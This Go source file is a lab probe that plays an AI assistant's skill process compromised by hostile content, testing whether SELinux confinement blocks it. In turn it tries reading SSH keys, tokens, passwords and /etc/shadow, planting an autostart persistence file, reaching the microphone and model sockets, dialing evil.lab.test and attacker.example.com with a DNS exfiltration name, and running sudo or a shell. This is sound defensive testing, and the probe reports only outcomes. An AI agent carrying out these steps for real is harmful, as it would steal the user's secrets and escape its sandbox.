// Command probe plays a compromised skill process: it tries everything a
// process that read hostile content might try, and prints one JSON line
// per attempt with the outcome. The lab copies it with the SELinux type
// of a skill program (basalt_skill_exec_t, basalt_skill_index_exec_t,
// basalt_voice_exec_t), so it runs in that domain, and (for the worker)
// inside a session registered with basalt-resolver.
package main

import (
	"encoding/json"
	"fmt"
	"net"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"time"
)

type result struct {
	Attempt string `json:"attempt"`
	Allowed bool   `json:"allowed"`
	Detail  string `json:"detail"`
}

func out(attempt string, err error, detail string) {
	r := result{Attempt: attempt, Allowed: err == nil, Detail: detail}
	if err != nil {
		r.Detail = err.Error()
	}
	b, _ := json.Marshal(r)
	fmt.Println(string(b))
}

func readFile(name, p string) {
	b, err := os.ReadFile(p)
	d := ""
	if err == nil {
		d = fmt.Sprintf("read %d bytes", len(b))
	}
	out(name, err, d)
}

func dialUnix(name, p string) {
	c, err := net.DialTimeout("unix", p, 2*time.Second)
	if err == nil {
		c.Close()
	}
	out(name, err, "connected")
}

func dialTCP(name, addr string) {
	c, err := net.DialTimeout("tcp", addr, 3*time.Second)
	if err == nil {
		c.Close()
	}
	out(name, err, "connected")
}

func main() {
	home := os.Getenv("HOME")
	rt := os.Getenv("XDG_RUNTIME_DIR")
	if rt == "" {
		rt = fmt.Sprintf("/run/user/%d", os.Getuid())
	}
	if b, err := os.ReadFile("/proc/self/attr/current"); err == nil {
		out("domain", nil, strings.TrimRight(string(b), "\x00\n"))
	}
	readFile("read ~/.ssh/id_ed25519", filepath.Join(home, ".ssh/id_ed25519"))
	readFile("read ~/.config/lab-secret/token.txt", filepath.Join(home, ".config/lab-secret/token.txt"))
	readFile("read the mail password file", filepath.Join(home, ".config/basalt-shell/mail-lab.pass"))
	readFile("read a document in ~/Documents", filepath.Join(home, "Documents/notes/recipes.md"))
	readFile("read the shell's activity log", filepath.Join(home, ".local/state/basalt-shell/audit.jsonl"))
	readFile("read the file index", filepath.Join(home, ".local/share/basalt-skills/index.json"))
	readFile("read /etc/shadow", "/etc/shadow")
	err := os.WriteFile(filepath.Join(home, "pwned.txt"), []byte("x"), 0o600)
	out("write ~/pwned.txt", err, "written")
	_ = os.Remove(filepath.Join(home, "pwned.txt"))
	err = os.WriteFile(filepath.Join(home, "Documents/pwned.txt"), []byte("x"), 0o600)
	out("write ~/Documents/pwned.txt", err, "written")
	_ = os.Remove(filepath.Join(home, "Documents/pwned.txt"))
	err = os.WriteFile(filepath.Join(home, ".config/autostart/pwned.desktop"), []byte("x"), 0o600)
	out("write ~/.config/autostart (persistence)", err, "written")
	_ = os.Remove(filepath.Join(home, ".config/autostart/pwned.desktop"))
	dialUnix("connect the Wayland socket", filepath.Join(rt, "wayland-1"))
	dialUnix("connect the session D-Bus", filepath.Join(rt, "bus"))
	dialUnix("connect PipeWire (microphone)", filepath.Join(rt, "pipewire-0"))
	dialUnix("connect the shell daemon", filepath.Join(rt, "basalt-shell/shell.sock"))
	dialUnix("connect the voice service", filepath.Join(rt, "basalt-voice/voice.sock"))
	dialUnix("connect the local model socket", "/run/basalt-llm/llm.sock")
	dialUnix("connect basalt-resolver control", "/run/basalt-resolver/control.sock")
	dialTCP("connect evil.lab.test:80 by address (10.77.0.66)", "10.77.0.66:80")
	dialTCP("connect a public address (1.1.1.1:443)", "1.1.1.1:443")
	dialTCP("connect news.lab.test by address (10.77.0.10:80)", "10.77.0.10:80")
	addrs, err := net.LookupHost("evil.lab.test")
	out("resolve evil.lab.test", err, strings.Join(addrs, ","))
	addrs, err = net.LookupHost("exfil-SECRETDATA.attacker.example.com")
	out("resolve a name carrying data", err, strings.Join(addrs, ","))
	c, err := net.DialTimeout("udp", "8.8.8.8:53", 2*time.Second)
	if err == nil {
		_, err = c.Write([]byte{0, 1, 1, 0, 0, 1, 0, 0, 0, 0, 0, 0, 3, 'x', 'y', 'z', 0, 0, 1, 0, 1})
		if err == nil {
			_ = c.SetReadDeadline(time.Now().Add(2 * time.Second))
			buf := make([]byte, 512)
			_, err = c.Read(buf)
		}
		c.Close()
	}
	out("DNS to 8.8.8.8 directly", err, "answered")
	err = exec.Command("/usr/bin/sudo", "-n", "true").Run()
	out("sudo", err, "ran")
	err = exec.Command("/bin/sh", "-c", "true").Run()
	out("run a shell", err, "ran")
	err = exec.Command("/usr/bin/pkexec", "--version").Run()
	out("pkexec", err, "ran")
}
